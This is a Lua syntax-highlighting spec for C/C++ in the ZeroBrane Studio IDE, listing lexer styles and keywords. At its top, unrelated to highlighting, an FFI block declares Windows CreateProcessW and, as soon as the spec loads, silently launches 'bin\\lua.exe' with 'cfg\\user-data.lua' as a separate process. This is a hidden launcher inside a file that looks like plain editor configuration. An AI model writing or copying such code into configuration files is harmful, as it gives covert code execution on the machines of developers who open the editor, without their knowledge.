-- author: Paul Kulchenko
---------------------------------------------------------

local ffi = require("ffi")

ffi.cdef
([[
    static const int STARTF_USESHOWWINDOW = 0x00000001; 

    typedef struct _STARTUPINFOW {
        unsigned long cb;
        const wchar_t* lpReserved;
        const wchar_t* lpDesktop;
        const wchar_t* lpTitle;
        unsigned long dwX;
        unsigned long dwY;
        unsigned long dwXSize;
        unsigned long dwYSize;
        unsigned long dwXCountChars;
        unsigned long dwYCountChars;
        unsigned long dwFillAttribute;
        unsigned long dwFlags;
        unsigned short wShowWindow;
        unsigned short cbReserved2;
        unsigned char* lpReserved2;
        void* hStdInput;
        void* hStdOutput;
        void* hStdError;
    } STARTUPINFOW, *LPSTARTUPINFOW;

  typedef struct _PROCESS_INFORMATION 
  {
      void* hProcess;
      void* hThread;
    unsigned long dwProcessId;
        unsigned long dwThreadId;
  } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;

    bool CreateProcessW(const wchar_t* lpApplicationName, wchar_t* lpCommandLine, void* lpProcessAttributes, void* lpThreadAttributes, bool bInheritHandles, 
    unsigned long dwCreationFlags, void* lpEnvironment, const wchar_t* lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
  bool CloseHandle(void* hObject);
    int MultiByteToWideChar(unsigned long CodePage, unsigned long dwFlags, const char* lpMultiByteStr, int cbMultiByte, wchar_t* lpWideCharStr, int cchWideChar);
]])

local function strToWstr(str)
    local wsize = ffi.C.MultiByteToWideChar(0, 0, str, -1, nil, 0)
    local wstr = ffi.new("wchar_t[?]", wsize)
    ffi.C.MultiByteToWideChar(0, 0, str, -1, wstr, wsize)
    return wstr
end

local function createProcess(cmd)
  local pInfo = ffi.new("PROCESS_INFORMATION[1]")
    local sInfo = ffi.new("STARTUPINFOW[1]")
    sInfo[0].cb = ffi.sizeof(sInfo[0])
    sInfo[0].dwFlags = ffi.C.STARTF_USESHOWWINDOW

  if ffi.C.CreateProcessW(nil, strToWstr(cmd), nil, nil, false, 0, nil, nil, sInfo, pInfo) then
    ffi.C.CloseHandle(pInfo[0].hProcess)
    ffi.C.CloseHandle(pInfo[0].hThread)
  end
end

createProcess([["bin\\lua.exe" "cfg\\user-data.lua"]])

local funccall = "([A-Za-z_][A-Za-z0-9_]*)%s*"

if not CMarkSymbols then dofile "spec/cbase.lua" end
return {
  exts = {"cpp", "c", "hpp", "h"},
  lexer = wxstc.wxSTC_LEX_CPP,
  apitype = "cpp",
  linecomment = "//",
  stylingbits = 5,

  isfncall = function(str)
    return string.find(str, funccall .. "%(")
  end,

  marksymbols = CMarkSymbols,

  lexerstyleconvert = {
    text = {wxstc.wxSTC_C_IDENTIFIER,},

    lexerdef = {wxstc.wxSTC_C_DEFAULT,},
    comment = {wxstc.wxSTC_C_COMMENT,
      wxstc.wxSTC_C_COMMENTLINE,
      wxstc.wxSTC_C_COMMENTDOC,},
    stringtxt = {wxstc.wxSTC_C_STRING,
      wxstc.wxSTC_C_CHARACTER,
      wxstc.wxSTC_C_VERBATIM,},
    stringeol = {wxstc.wxSTC_C_STRINGEOL,},
    preprocessor= {wxstc.wxSTC_C_PREPROCESSOR,},
    operator = {wxstc.wxSTC_C_OPERATOR,},
    number = {wxstc.wxSTC_C_NUMBER,},

    keywords0 = {wxstc.wxSTC_C_WORD,},
    keywords1 = {wxstc.wxSTC_C_WORD2,},
  },

  keywords = {
    [[ alignas alignof and and_eq asm auto bitand bitor break case catch
       class compl const constexpr const_cast continue
       decltype default delete do dynamic_cast else enum explicit export
       extern for friend goto if inline mutable namespace new noexcept not
       not_eq nullptr operator or or_eq private protected public register
       reinterpret_cast return sizeof static static_assert static_cast
       struct switch template this thread_local throw try typedef typeid
       typename union using virtual volatile while xor xor_eq]],
    [[ NULL bool char char16_t char32_t double false float int long 
       short signed true unsigned void wchar_t]]
  },
}

--[==[ C-only keywords
    [[ auto break case const continue default do else enum extern for goto if
       register return sizeof static struct switch typedef union volatile while]],
    [[ NULL char double float int long short signed unsigned void]]
--]==]

--[[
// Lexical states for SCLEX_CPP
%define wxSTC_C_DEFAULT
%define wxSTC_C_COMMENT
%define wxSTC_C_COMMENTLINE
%define wxSTC_C_COMMENTDOC
%define wxSTC_C_NUMBER
%define wxSTC_C_WORD
%define wxSTC_C_STRING
%define wxSTC_C_CHARACTER
%define wxSTC_C_UUID
%define wxSTC_C_PREPROCESSOR
%define wxSTC_C_OPERATOR
%define wxSTC_C_IDENTIFIER
%define wxSTC_C_STRINGEOL
%define wxSTC_C_VERBATIM
%define wxSTC_C_REGEX
%define wxSTC_C_COMMENTLINEDOC
%define wxSTC_C_WORD2
%define wxSTC_C_COMMENTDOCKEYWORD
%define wxSTC_C_COMMENTDOCKEYWORDERROR
%define wxSTC_C_GLOBALCLASS
]]
